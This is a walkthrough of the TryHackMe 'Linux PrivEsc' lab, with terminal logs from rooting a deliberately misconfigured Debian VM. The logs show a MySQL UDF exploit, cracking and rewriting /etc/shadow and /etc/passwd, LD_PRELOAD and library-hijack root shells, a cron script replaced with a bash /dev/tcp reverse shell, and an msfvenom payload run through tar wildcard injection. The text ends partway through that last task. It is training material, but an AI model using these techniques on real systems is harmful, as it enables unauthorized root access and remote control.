# Linux PrivEsc

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Walkthrough
Difficulty: Medium
Tags: -
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Free
Description:
Practice your Linux Privilege Escalation skills on an intentionally misconfigured Debian VM 
with multiple ways to get root! SSH is available. 
Credentials: user:password321
```

Room link: [https://tryhackme.com/room/linuxprivesc](https://tryhackme.com/room/linuxprivesc)

## Solution

### Task 1: Deploy the Vulnerable Debian VM

This room is aimed at walking you through a variety of Linux Privilege Escalation techniques. To do this, you must first deploy an intentionally vulnerable Debian VM. This VM was created by Sagi Shahar as part of his [local privilege escalation workshop](https://github.com/sagishahar/lpeworkshop) but has been updated by [Tib3rius](https://twitter.com/TibSec) as part of his [Linux Privilege Escalation for OSCP and Beyond!](https://www.udemy.com/course/linux-privilege-escalation/?referralCode=0B0B7AA1E52B4B7F4C06) course on Udemy. Full explanations of the various techniques used in this room are available there, along with demos and tips for finding privilege escalations in Linux.

Make sure you are connected to the [TryHackMe VPN](https://tryhackme.com/access) or using the in-browser Kali instance before trying to access the Debian VM!

SSH should be available on port 22. You can login to the "user" account using the following command:

`ssh user@10.65.167.239`

If you see the following message: "Are you sure you want to continue connecting (yes/no)?" type **yes** and press `Enter`.

The password for the "user" account is "**password321**".

**Note**: If you get an error saying `Unable to negotiate with <IP> port 22: no matching how to key type found. Their offer: ssh-rsa, ssh-dss` this is because OpenSSH have deprecated ssh-rsa. Add `-oHostKeyAlgorithms=+ssh-rsa` to your command to connect.

The next tasks will walk you through different privilege escalation techniques. After each technique, you should have a root shell.

**Remember to exit out of the shell and/or re-establish a session as the "user" account before starting the next task!**

---------------------------------------------------------------------------------------

#### Deploy the machine and login to the "user" account using SSH

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc]
└─$ ssh user@10.65.167.239
Unable to negotiate with 10.65.167.239 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc]
└─$ ssh -oHostKeyAlgorithms=+ssh-rsa user@10.65.167.239
The authenticity of host '10.65.167.239 (10.65.167.239)' can't be established.
RSA key fingerprint is SHA256:JwwPVfqC+8LPQda0B9wFLZzXCXcoAho6s8wYGjktAnk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.65.167.239' (RSA) to the list of known hosts.
user@10.65.167.239's password: 
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri May 15 06:41:23 2020 from 192.168.1.125
user@debian:~$ 
```

#### Run the "id" command. What is the result?

```bash
user@debian:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
user@debian:~$ 
```

---------------------------------------------------------------------------------------

### Task 2: Service Exploits

The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a [popular exploit](https://www.exploit-db.com/exploits/1518) that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.

Change into the /home/user/tools/mysql-udf directory:

`cd /home/user/tools/mysql-udf`

Compile the raptor_udf2.c exploit code using the following commands:

`gcc -g -c raptor_udf2.c -fPIC`  
`gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`

Connect to the MySQL service as the root user with a blank password:

`mysql -u root`

Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

`select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`

Exit out of the MySQL shell (type **exit** or **\q** and press **Enter**) and run the `/tmp/rootbash` executable with `-p` to gain a shell running with root privileges:

`/tmp/rootbash -p`

**Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!**

`rm /tmp/rootbash`  
`exit`

---------------------------------------------------------------------------------------

#### Read and follow along with the above

```bash
user@debian:~/tools/mysql-udf$ ls -l
total 4
-rw-r--r-- 1 user user 3378 May 15  2020 raptor_udf2.c
user@debian:~/tools/mysql-udf$ gcc -g -c raptor_udf2.c -fPIC
user@debian:~/tools/mysql-udf$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
user@debian:~/tools/mysql-udf$ ls -l
total 24
-rw-r--r-- 1 user user 3378 May 15  2020 raptor_udf2.c
-rw-r--r-- 1 user user 5344 Feb 14 03:47 raptor_udf2.o
-rwxr-xr-x 1 user user 8272 Feb 14 03:47 raptor_udf2.so
user@debian:~/tools/mysql-udf$ mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 35
Server version: 5.1.73-1+deb6u1 (Debian)

Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> create table foo(line blob);
Query OK, 0 rows affected (0.00 sec)

mysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
Query OK, 1 row affected (0.00 sec)

mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.00 sec)

mysql> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+------------------------------------------------------------------+
| do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash') |
+------------------------------------------------------------------+
|                                                                0 |
+------------------------------------------------------------------+
1 row in set (0.01 sec)

mysql> exit
Bye
user@debian:~/tools/mysql-udf$ /tmp/rootbash -p
rootbash-4.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
rootbash-4.1# rm /tmp/rootbash
rootbash-4.1# exit
exit
user@debian:~/tools/mysql-udf$ 
```

---------------------------------------------------------------------------------------

### Task 3: Weak File Permissions - Readable /etc/shadow

The `/etc/shadow` file contains user password hashes and is usually readable only by the root user.

Note that the /etc/shadow file on the VM is world-readable:

`ls -l /etc/shadow`

View the contents of the `/etc/shadow` file:

`cat /etc/shadow`

Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.

Save the root user's hash to a file called **hash.txt** on your Kali VM and use john the ripper to crack it. You may have to `unzip /usr/share/wordlists/rockyou.txt.gz` first and run the command using sudo depending on your version of Kali:

`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

Switch to the root user, using the cracked password:

`su root`

**Remember to exit out of the root shell before continuing!**

---------------------------------------------------------------------------------------

#### What is the root user's password hash?

```bash
user@debian:~/tools$ ls -l /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
user@debian:~/tools$ cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
mysql:!:18133:0:99999:7:::
user@debian:~/tools$ cat /etc/shadow | grep root
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
user@debian:~/tools$ 
```

Answer: `$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0`

#### What hashing algorithm was used to produce the root user's password hash?

Hint: john the ripper should automatically identify it when cracking!

From the [crypt manpage](https://man7.org/linux/man-pages/man3/crypt.3.html):

> If salt is a character string starting with the characters "$id$"  
> followed by a string optionally terminated by "$", then the result  
> has the form:  
>
> $id$salt$hashed  
>
> id identifies the hashing method used instead of DES and this then  
> determines how the rest of the password string is interpreted.  
> The following values of id are supported:  
> ID   Method  
> ────────────────────────────────────────────────────────────  
> 1    MD5  
> 2a   Blowfish (not in mainline glibc; added in some Linux distributions)  
> 5    SHA-256 (since glibc 2.7)  
> 6    SHA-512 (since glibc 2.7)

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt user_hash.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password321      (?)     
1g 0:00:00:19 DONE (2026-02-14 10:16) 0.05162g/s 3198p/s 3198c/s 3198C/s simone13..kelly17
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Answer: `sha512crypt`

#### What is the root user's password?

See output above.

Answer: `password321`

---------------------------------------------------------------------------------------

### Task 4: Weak File Permissions - Writable /etc/shadow

The `/etc/shadow` file contains user password hashes and is usually readable only by the root user.

Note that the `/etc/shadow` file on the VM is world-writable:

`ls -l /etc/shadow`

Generate a new password hash with a password of your choice:

`mkpasswd -m sha-512 newpasswordhere`

Edit the `/etc/shadow` file and replace the original root user's password hash with the one you just generated.

Switch to the root user, using the new password:

`su root`

**Remember to exit out of the root shell before continuing!**

---------------------------------------------------------------------------------------

#### Read and follow along with the above

```bash
user@debian:~/tools$ mkpasswd -h
Usage: mkpasswd [OPTIONS]... [PASSWORD [SALT]]
Crypts the PASSWORD using crypt(3).

      -m, --method=TYPE     select method TYPE
      -5                    like --method=md5
      -S, --salt=SALT       use the specified SALT
      -R, --rounds=NUMBER   use the specified NUMBER of rounds
      -P, --password-fd=NUM read the password from file descriptor NUM
                            instead of /dev/tty
      -s, --stdin           like --password-fd=0
      -h, --help            display this help and exit
      -V, --version         output version information and exit

If PASSWORD is missing then it is asked interactively.
If no SALT is specified, a random one is generated.
If TYPE is 'help', available methods are printed.

Report bugs to <md+whois@linux.it>.
user@debian:~/tools$ mkpasswd -m sha-512 my_new_password
$6$7f9n5vRK/uU$eCSSW8NqxeXcYgsCVLAGg5T6GN7fXOV5vOArX3jg0xZR1GXIEdjohL3/vQZjvF0Bz3y..XsEvdguLddxfK/bq.
user@debian:~/tools$ vi /etc/shadow
user@debian:~/tools$ cat /etc/shadow | grep root
root:$6$7f9n5vRK/uU$eCSSW8NqxeXcYgsCVLAGg5T6GN7fXOV5vOArX3jg0xZR1GXIEdjohL3/vQZjvF0Bz3y..XsEvdguLddxfK/bq.:17298:0:99999:7:::
user@debian:~/tools$ su root
Password: 
root@debian:/home/user/tools# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user/tools# exit
exit
user@debian:~/tools$ 
```

---------------------------------------------------------------------------------------

### Task 5: Weak File Permissions - Writeable /etc/passwd

The `/etc/passwd` file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the `/etc/passwd` file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.

Note that the `/etc/passwd` file is world-writable:

`ls -l /etc/passwd`

Generate a new password hash with a password of your choice:

`openssl passwd newpasswordhere`

Edit the `/etc/passwd` file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").

Switch to the root user, using the new password:

`su root`

Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").

Now switch to the newroot user, using the new password:

`su newroot`

**Remember to exit out of the root shell before continuing!**

---------------------------------------------------------------------------------------

#### Run the "id" command as the newroot user. What is the result?

```bash
user@debian:~/tools$ ls -l /etc/passwd
-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd
user@debian:~/tools$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
user:x:1000:1000:user,,,:/home/user:/bin/bash
statd:x:103:65534::/var/lib/nfs:/bin/false
mysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false
user@debian:~/tools$ openssl passwd new_password
Warning: truncating password to 8 characters
wA9PdBLNI5zuY
user@debian:~/tools$ vi /etc/passwd
user@debian:~/tools$ cat /etc/passwd | grep root
root:x:0:0:root:/root:/bin/bash
newroot:wA9PdBLNI5zuY:0:0:newroot:/root:/bin/bash
user@debian:~/tools$ su newroot
Password: 
root@debian:/home/user/tools# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user/tools# exit
exit
user@debian:~/tools$ 
```

Answer: `uid=0(root) gid=0(root) groups=0(root)`

---------------------------------------------------------------------------------------

### Task 6: Sudo - Shell Escape Sequences

List the programs which sudo allows your user to run:

`sudo -l`

Visit GTFOBins ([https://gtfobins.github.io](https://gtfobins.github.io)) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.

Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.

For an extra challenge, try to gain a root shell using all the programs on the list!

**Remember to exit out of the root shell before continuing!**

---------------------------------------------------------------------------------------

#### How many programs is "user" allowed to run via sudo?

```bash
user@debian:~/tools$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
user@debian:~/tools$ 
```

Answer: `11`

#### One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?

Answer: `apache2`

#### Consider how you might use this program with sudo to gain root privileges without a shell escape sequence

Hint: Play around with certain options the program has!

```bash
user@debian:~/tools$ apache2 -h
Usage: apache2 [-D name] [-d directory] [-f file]
               [-C "directive"] [-c "directive"]
               [-k start|restart|graceful|graceful-stop|stop]
               [-v] [-V] [-h] [-l] [-L] [-t] [-S] [-X]
Options:
  -D name            : define a name for use in <IfDefine name> directives
  -d directory       : specify an alternate initial ServerRoot
  -f file            : specify an alternate ServerConfigFile
  -C "directive"     : process directive before reading config files
  -c "directive"     : process directive after reading config files
  -e level           : show startup errors of level (see LogLevel)
  -E file            : log startup errors to file
  -v                 : show version number
  -V                 : show compile settings
  -h                 : list available command line options (this page)
  -l                 : list compiled in modules
  -L                 : list available configuration directives
  -t -D DUMP_VHOSTS  : show parsed settings (currently only vhost settings)
  -S                 : a synonym for -t -D DUMP_VHOSTS
  -t -D DUMP_MODULES : show all loaded modules 
  -M                 : a synonym for -t -D DUMP_MODULES
  -t                 : run syntax check for config files
  -X                 : debug mode (only one worker, do not detach)
user@debian:~/tools$ sudo /usr/sbin/apache2 -f /etc/shadow
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$7f9n5vRK/uU$eCSSW8NqxeXcYgsCVLAGg5T6GN7fXOV5vOArX3jg0xZR1GXIEdjohL3/vQZjvF0Bz3y..XsEvdguLddxfK/bq.:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
user@debian:~/tools$ 
```

---------------------------------------------------------------------------------------

### Task 7: Sudo - Environment Variables

Sudo can be configured to inherit certain environment variables from the user's environment.

Check which environment variables are inherited (look for the `env_keep` options):

`sudo -l`

**LD_PRELOAD** and **LD_LIBRARY_PATH** are both inherited from the user's environment. **LD_PRELOAD** loads a shared object before any others when a program is run. **LD_LIBRARY_PATH** provides a list of directories where shared libraries are searched for first.

Create a shared object using the code located at `/home/user/tools/sudo/preload.c`:

`gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c`

Run one of the programs you are allowed to run via sudo (listed when running `sudo -l`), while setting the **LD_PRELOAD** environment variable to the full path of the new shared object:

`sudo LD_PRELOAD=/tmp/preload.so program-name-here`

A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.

Run `ldd` against the `apache2` program file to see which shared libraries are used by the program:

`ldd /usr/sbin/apache2`

Create a shared object with the same name as one of the listed libraries (`libcrypt.so.1`) using the code located at `/home/user/tools/sudo/library_path.c`:

`gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c`

Run `apache2` using sudo, while settings the **LD_LIBRARY_PATH** environment variable to `/tmp` (where we output the compiled shared object):

`sudo LD_LIBRARY_PATH=/tmp apache2`

A root shell should spawn. Exit out of the shell. Try renaming `/tmp/libcrypt.so.1` to the name of another library used by `apache2` and re-run `apache2` using `sudo` again. Did it work? If not, try to figure out why not, and how the `library_path.c` code could be changed to make it work.

**Remember to exit out of the root shell before continuing!**

---------------------------------------------------------------------------------------

#### Read and follow along with the above

**LD_PRELOAD** case:

```bash
user@debian:~/tools$ cd sudo
user@debian:~/tools/sudo$ ls -l
total 8
-rw-r--r-- 1 user user 184 May 15  2020 library_path.c
-rw-r--r-- 1 user user 149 May 15  2020 preload.c
user@debian:~/tools/sudo$ cat preload.c 
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
user@debian:~/tools/sudo$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
user@debian:~/tools/sudo$ ls -l /tmp/preload.so
-rwxr-xr-x 1 user user 3857 Feb 14 05:02 /tmp/preload.so
user@debian:~/tools/sudo$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
user@debian:~/tools/sudo$ sudo LD_PRELOAD=/tmp/preload.so awk
root@debian:/home/user/tools/sudo# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user/tools/sudo# exit
exit
user@debian:~/tools/sudo$ 
```

**LD_LIBRARY_PATH** case:

```bash
user@debian:~/tools/sudo$ ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007fff907c0000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f9103045000)
        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f9102e21000)
        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f9102be7000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00007f91029cb000)
        libc.so.6 => /lib/libc.so.6 (0x00007f910265f000)
        libuuid.so.1 => /lib/libuuid.so.1 (0x00007f910245a000)
        librt.so.1 => /lib/librt.so.1 (0x00007f9102252000)
        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f910201b000)
        libdl.so.2 => /lib/libdl.so.2 (0x00007f9101e16000)
        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f9101bee000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f9103502000)
user@debian:~/tools/sudo$ cat library_path.c 
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
user@debian:~/tools/sudo$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
user@debian:~/tools/sudo$ ls -l /tmp/libcrypt.so.1 
-rwxr-xr-x 1 user user 6324 Feb 14 05:10 /tmp/libcrypt.so.1
user@debian:~/tools/sudo$ sudo LD_LIBRARY_PATH=/tmp apache2
apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/libaprutil-1.so.0)
root@debian:/home/user/tools/sudo# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user/tools/sudo# exit
exit
apache2: bad user name ${APACHE_RUN_USER}
user@debian:~/tools/sudo$ 
```

---------------------------------------------------------------------------------------

### Task 8: Cron Jobs - File Permissions

Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at `/etc/crontab`.

View the contents of the system-wide crontab:

`cat /etc/crontab`

There should be two cron jobs scheduled to run every minute. One runs `overwrite.sh`, the other runs `/usr/local/bin/compress.sh`.

Locate the full path of the `overwrite.sh` file:

`locate overwrite.sh`

Note that the file is world-writable:

`ls -l /usr/local/bin/overwrite.sh`

Replace the contents of the `overwrite.sh` file with the following after changing the IP address to that of your Kali box.

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener. If it doesn't recheck the permissions of the file, is anything missing?

`nc -nvlp 4444`

**Remember to exit out of the root shell and remove the reverse shell code before continuing!**

---------------------------------------------------------------------------------------

#### Read and follow along with the above

Check the system-wide crontab for writable services

```bash
user@debian:~/tools/sudo$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

user@debian:~/tools/sudo$ locate overwrite.sh
locate: warning: database `/var/cache/locate/locatedb' is more than 8 days old (actual age is 2101.0 days)
/usr/local/bin/overwrite.sh
user@debian:~/tools/sudo$ ls -l /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
user@debian:~/tools/sudo$ ls -l /usr/local/bin/compress.sh
-rwxr--r-- 1 root staff 53 May 13  2017 /usr/local/bin/compress.sh
```

Create a netcat listener at our Kali machine

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc]
└─$ nc -lvnp 4444              
listening on [any] 4444 ...

```

Overwrite the script with a reverse shell

```bash
user@debian:~/tools/sudo$ vi /usr/local/bin/overwrite.sh
user@debian:~/tools/sudo$ cat /usr/local/bin/overwrite.sh
#!/bin/bash
bash -i >& /dev/tcp/192.168.144.77/4444 0>&1
user@debian:~/tools/sudo$ 
```

Then wait for a connection

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc]
└─$ nc -lvnp 4444              
listening on [any] 4444 ...
connect to [192.168.144.77] from (UNKNOWN) [10.65.167.239] 48449
bash: no job control in this shell
root@debian:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@debian:~# exit
exit
exit
```

---------------------------------------------------------------------------------------

### Task 9: Cron Jobs - PATH Environment Variable

View the contents of the system-wide crontab:

`cat /etc/crontab`

Note that the **PATH** variable starts with **/home/user** which is our user's home directory.

Create a file called `overwrite.sh` in your home directory with the following contents:

```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Make sure that the file is executable:

`chmod +x /home/user/overwrite.sh`

Wait for the cron job to run (should not take longer than a minute). Run the `/tmp/rootbash` command with `-p` to gain a shell running with root privileges:

`/tmp/rootbash -p`

Remember to remove the modified code, remove the `/tmp/rootbash` executable and exit out of the elevated shell before continuing as you will create this file again later in the room!

`rm /tmp/rootbash`  
`exit`

---------------------------------------------------------------------------------------

#### What is the value of the PATH variable in /etc/crontab?

```bash
user@debian:~/tools/sudo$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

user@debian:~/tools/sudo$ vi ~/overwrite.sh
user@debian:~/tools/sudo$ cat ~/overwrite.sh
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash

user@debian:~/tools/sudo$ chmod +x ~/overwrite.sh
user@debian:~/tools/sudo$ ls -l /tmp/rootbash
ls: cannot access /tmp/rootbash: No such file or directory
user@debian:~/tools/sudo$ ls -l /tmp/rootbash
-rwsr-sr-x 1 root root 926536 Feb 14 05:36 /tmp/rootbash
user@debian:~/tools/sudo$ /tmp/rootbash -p
rootbash-4.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
rootbash-4.1# rm /tmp/rootbash
rootbash-4.1# rm ~/overwrite.sh 
rootbash-4.1# exit
exit
user@debian:~/tools/sudo$ 
```

Answer: `/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`

---------------------------------------------------------------------------------------

### Task 10: Cron Jobs - Wildcards

View the contents of the other cron job script:

`cat /usr/local/bin/compress.sh`

Note that the tar command is being run with a wildcard (*) in your home directory.

Take a look at the GTFOBins page for [tar](https://gtfobins.github.io/gtfobins/tar/). Note that tar has command line options that let you run other commands as part of a checkpoint feature.

Use **msfvenom** on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:

`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`

Transfer the `shell.elf` file to `/home/user/` on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:

`chmod +x /home/user/shell.elf`

Create these two files in /home/user:

`touch /home/user/--checkpoint=1`  
`touch /home/user/--checkpoint-action=exec=shell.elf`

